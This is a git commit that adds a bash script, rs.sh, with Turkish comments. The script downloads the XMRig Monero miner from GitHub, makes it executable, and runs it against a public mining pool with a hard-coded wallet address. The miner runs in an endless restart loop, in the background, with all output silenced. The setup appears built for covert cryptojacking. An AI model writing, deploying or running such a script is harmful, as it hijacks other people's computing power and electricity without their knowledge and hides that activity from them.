8628db0d78a5334eda4abf8966cb16de5991cb49
gokm5133 <gokm5133@gmail.com>
2025-04-03 15:49:05 +0300

    Create rs.sh

---
+++ rs.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+# XMRig madencisini indir
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz
+
+# Arşivi çıkar
+tar -xvzf xmrig-6.16.0-linux-x64.tar.gz
+
+# XMRig dizinine git
+cd xmrig-6.16.0
+
+# XMRig'i çalıştırılabilir yap
+chmod +x xmrig
+
+# XMRig'i yeniden başlatma döngüsü (sessiz ve arka planda)
+while true; do
+  ./xmrig -o pool.supportxmr.com:3333 -u 88NXbHvPdph8KkXhSbou43iLmbo7MrpBp6nycitmj2rCR1tkfN2kEAcHMiHd2zZMgy7VtRj6T5p4dDhNMB2UzwHwPiiSHcN -p x -B > /dev/null 2>&1
+  sleep 5
+done
